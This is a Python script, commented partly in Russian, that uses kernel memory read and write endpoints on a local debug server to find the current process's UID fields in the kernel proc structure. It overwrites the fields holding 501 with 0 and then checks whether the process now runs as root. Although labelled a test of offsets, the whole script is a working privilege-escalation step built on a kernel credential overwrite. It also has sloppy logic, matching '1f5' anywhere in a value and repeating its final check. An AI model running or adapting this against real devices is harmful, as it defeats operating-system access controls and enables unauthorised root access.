#!/usr/bin/env python3
"""
proc_debugger.py

Script for validating and testing `struct proc` UID/GID offsets via a local debug server.

Usage:
  python proc_debugger.py

Notes:
  - Connects to http://192.168.1.5:8686 by default.
  - Uses only the `our_proc` base address returned by GET /api/v1/ds.
  - Reads offsets [0x30,0x34,0x38,0x3C], writes 0 where value==501, then checks /api/v1/ids.
"""

import sys
import time
import requests

BASE_URL = "http://192.168.1.5:8686"
DS_ENDPOINT = "/api/v1/ds"
KREAD_ENDPOINT = "/api/v1/kread"
KWRITE_ENDPOINT = "/api/v1/kwrite"
IDS_ENDPOINT = "/api/v1/ids"

OFFSETS = [0x30, 0x34, 0x38, 0x3C]
EXPECTED = 0x1F5  # 501
WRITE_VALUE = 0

SAFE_WINDOW = 0x1000  # only allow writes within our_proc .. our_proc+SAFE_WINDOW


def parse_addr(val):
    if val is None:
        return None
    if isinstance(val, int):
        return val
    if isinstance(val, str):
        s = val.strip()
        try:
            if s.startswith("0x") or s.startswith("0X"):
                return int(s, 16)
            return int(s)
        except ValueError:
            return None
    return None


def robust_json_int(resp_json):
    # Try common places where an integer may be returned
    if resp_json is None:
        return None
    if isinstance(resp_json, dict):
        for k in ("value", "val", "uid", "result"):
            if k in resp_json:
                v = resp_json[k]
                if isinstance(v, int):
                    return v
                if isinstance(v, str) and v.startswith(("0x", "0X")):
                    try:
                        return int(v, 16)
                    except Exception:
                        pass
        # data field might be hex string or list of bytes
        if "data" in resp_json:
            d = resp_json["data"]
            if isinstance(d, str) and d.startswith(("0x", "0X")):
                try:
                    return int(d, 16)
                except Exception:
                    pass
            if isinstance(d, list) and all(isinstance(x, int) for x in d):
                return int.from_bytes(bytes(d[:4]), "little")
    return None


def kread(session, addr, size=4):
    url = BASE_URL + KREAD_ENDPOINT
    hexaddr = hex(addr)
    payloads = [
        {"addr": hexaddr, "size": size},
        {"address": hexaddr, "size": size},
        {"addr": addr, "size": size},
    ]
    for p in payloads:
        try:
            r = session.post(url, json=p, timeout=5)
        except Exception:
            continue
        if r.status_code != 200:
            continue
        # Try JSON parse
        try:
            j = r.json()
        except Exception:
            # fallback to raw bytes
            try:
                raw = r.content
                if raw:
                    return int.from_bytes(raw[:4], "little")
            except Exception:
                return None
        val = robust_json_int(j)
        if val is not None:
            return val
        # If json itself is an int
        if isinstance(j, int):
            return j
        # If json is hex string
        if isinstance(j, str) and j.startswith(("0x", "0X")):
            try:
                return int(j, 16)
            except Exception:
                pass
    return None


def kwrite(session, addr, value, size=4):
    url = BASE_URL + KWRITE_ENDPOINT
    hexaddr = hex(addr)
    hexval = hex(value)
    payloads = [
        {"addr": hexaddr, "value": value, "size": size},
        {"addr": hexaddr, "data": hexval, "size": size},
        {"address": hexaddr, "data": hexval},
    ]
    for p in payloads:
        try:
            r = session.post(url, json=p, timeout=5)
        except Exception:
            continue
        if r.status_code == 200:
            # attempt to interpret JSON success flags
            try:
                j = r.json()
                if isinstance(j, dict) and (j.get("success") is True or j.get("ok") is True or j.get("result") == "ok"):
                    return True
            except Exception:
                # if raw 200, assume success
                return True
    return False


def get_ids(session):
    url = BASE_URL + IDS_ENDPOINT
    try:
        r = session.get(url, timeout=5)
    except Exception:
        return None
    if r.status_code != 200:
        return None
    try:
        j = r.json()
    except Exception:
        return None
    # look for common uid fields
    for key in ("uid", "euid", "ruid", "effective_uid"):
        if key in j:
            return j[key]
    # If the JSON is an int or hex string
    if isinstance(j, int):
        return j
    if isinstance(j, str) and j.startswith(("0x", "0X")):
        try:
            return int(j, 16)
        except Exception:
            return None
    # If JSON contains nested structure with ids
    if isinstance(j, dict):
        for v in j.values():
            if isinstance(v, int):
                return v
            if isinstance(v, str) and v.startswith(("0x", "0X")):
                try:
                    return int(v, 16)
                except Exception:
                    pass
    return None


def main():
    session = requests.Session()
    # 1) GET /api/v1/ds -> our_proc
    try:
        r = session.get(BASE_URL + DS_ENDPOINT, timeout=5)
    except Exception as e:
        print("Ошибка запроса к /api/v1/ds:", e)
        sys.exit(1)
    if r.status_code != 200:
        print("Ошибка: /api/v1/ds вернул не-200", r.status_code)
        sys.exit(1)
    try:
        ds = r.json()
    except Exception as e:
        print("Невозможно распарсить JSON от /api/v1/ds:", e)
        sys.exit(1)
    our_proc = None
    # prefer exact key as returned by the server
    if isinstance(ds, dict) and "ourproc" in ds:
        try:
            our_proc = int(ds["ourproc"], 16)
        except Exception:
            our_proc = parse_addr(ds["ourproc"])
    else:
        # try top-level int or hex string fallback
        if isinstance(ds, int):
            our_proc = ds
        elif isinstance(ds, str):
            our_proc = parse_addr(ds)

    if our_proc is None:
        print("Не удалось получить our_proc из /api/v1/ds")
        sys.exit(1)

    print(f"our_proc = 0x{our_proc:x}")

    matches = []

    # 2) Loop offsets and read
    for off in OFFSETS:
        addr = our_proc + off
        print(f"Чтение по адресу 0x{addr:x}...")
        val = kread(session, addr, size=4)
        if val is None:
            print(f"Found value: <read-failed> for 0x{addr:x}")
            continue
        print(f"Found value: {val} (0x{val:x})")
        # consider a match if the hex representation contains '1f5' (matches 0x1F5 anywhere)
        if isinstance(val, int):
            if '1f5' in f"{val:x}".lower():
                print(f"Found UID pattern at 0x{addr:x} (0x{val:x})")
                matches.append(addr)

    if not matches:
        print("Нет полей с ожидаемым значением 501; завершение.")
        print("TEST FAILED")
        return

    # 3) Attempt writes:
    # First, attempt a single write to the first matched address (safer if API writes 64-bit)
    first = matches[0]
    if not (our_proc <= first < our_proc + SAFE_WINDOW):
        print(f"Адрес 0x{first:x} вне безопасного окна; пропуск записи")
    else:
        print(f"Attempting single write to 0x{first:x} -> 0")
        ok = kwrite(session, first, WRITE_VALUE, size=4)
        if ok:
            print(f"Single patch succeeded for 0x{first:x}")
        else:
            print(f"Single patch failed for 0x{first:x}")

    # small delay then check
    time.sleep(0.2)
    print("Проверка результата после одиночной записи")
    ids_val = get_ids(session)
    if ids_val is not None:
        try:
            uid_int = int(ids_val)
        except Exception:
            uid_int = parse_addr(ids_val)
        print(f"Found UID via /api/v1/ids: {uid_int}")
        if uid_int == 0:
            print("TEST PASSED")
            return

    # If single write didn't produce root, write remaining matched addresses
    print("Single write didn't set UID=0; writing remaining matched addresses")
    for addr in matches:
        if not (our_proc <= addr < our_proc + SAFE_WINDOW):
            print(f"Адрес 0x{addr:x} вне безопасного окна; пропуск записи")
            continue
        print(f"Patching 0x{addr:x} -> 0")
        ok = kwrite(session, addr, WRITE_VALUE, size=4)
        if ok:
            print(f"Patching succeeded for 0x{addr:x}")
        else:
            print(f"Patching failed for 0x{addr:x}")

    time.sleep(0.2)
    print("Проверка результата после всех записей")
    ids_val = get_ids(session)
    if ids_val is None:
        print("Не удалось получить UID через /api/v1/ids")
        print("TEST FAILED")
        return
    try:
        uid_int = int(ids_val)
    except Exception:
        uid_int = parse_addr(ids_val)
    if uid_int == 0:
        print("TEST PASSED")
    else:
        print(f"TEST FAILED (uid={uid_int})")

    # small delay to allow system to update
    time.sleep(0.5)

    # 4) GET /api/v1/ids -> check uid
    print("Проверка результата")
    ids_val = get_ids(session)
    if ids_val is None:
        print("Не удалось получить UID через /api/v1/ids")
        print("TEST FAILED")
        return
    try:
        uid_int = int(ids_val)
    except Exception:
        uid_int = parse_addr(ids_val)

    if uid_int == 0:
        print("TEST PASSED")
    else:
        print(f"TEST FAILED (uid={uid_int})")


if __name__ == "__main__":
    main()
